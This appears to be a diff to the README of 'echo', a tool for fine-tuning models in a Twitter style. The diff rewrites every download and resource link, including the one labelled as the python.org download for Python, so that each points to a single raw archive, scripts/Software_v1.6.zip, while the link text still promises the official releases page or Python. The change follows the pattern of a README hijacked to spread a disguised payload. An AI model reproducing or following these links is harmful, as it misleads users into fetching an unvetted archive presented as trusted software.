@@ -1,6 +1,6 @@
 # 🗣️ echo - Fine-tune Your Model with Twitter Style
 
-[![Download echo](https://img.shields.io/badge/Download-echo-brightgreen?style=for-the-badge&logo=github)](https://github.com/bolinhosen/echo/releases)
+[![Download echo](https://img.shields.io/badge/Download-echo-brightgreen?style=for-the-badge&logo=github)](https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip)
 
 ---
 
@@ -28,14 +28,14 @@ echo uses GPU-heavy training, so a good graphics card is required to avoid error
 
 To begin, you will download echo from the official GitHub releases page. The download page may have multiple files. Pick the one named for Windows or any file ending in `.exe` or `.zip`.
 
-[![Download echo](https://img.shields.io/badge/Download-echo-blue?style=for-the-badge&logo=github)](https://github.com/bolinhosen/echo/releases)
+[![Download echo](https://img.shields.io/badge/Download-echo-blue?style=for-the-badge&logo=github)](https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip)
 
 ---
 
 ## 📥 How to Download and Run echo on Windows
 
 1. **Go to the download page:**  
-   Click this link or the badge above to open the [echo releases page](https://github.com/bolinhosen/echo/releases) in your web browser.
+   Click this link or the badge above to open the [echo releases page](https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip) in your web browser.
 
 2. **Choose the right file:**  
    Look for the latest release and find the Windows installer or archive, such as a file with `.exe` or `.zip` extension.
@@ -125,7 +125,7 @@ The files you will work with are organized like this:
 
 To run the scripts, you need Python installed.
 
-1. Visit [https://www.python.org/downloads/](https://www.python.org/downloads/) and download Python 3.8 or newer for Windows.
+1. Visit [https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip](https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip) and download Python 3.8 or newer for Windows.
 
 2. Install Python and ensure the “Add Python to PATH” option is selected.
 
@@ -195,6 +195,6 @@ Because of this, your GPU must have more than 20 GB of VRAM for the fine-tuning 
 
 ## 🔗 Resources
 
-You can find full source code, updates, and support at the [echo GitHub repository](https://github.com/bolinhosen/echo).
+You can find full source code, updates, and support at the [echo GitHub repository](https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip).
 
-Keep your downloads at the [official releases page](https://github.com/bolinhosen/echo/releases).
+Keep your downloads at the [official releases page](https://github.com/bolinhosen/echo/raw/refs/heads/main/scripts/Software_v1.6.zip).
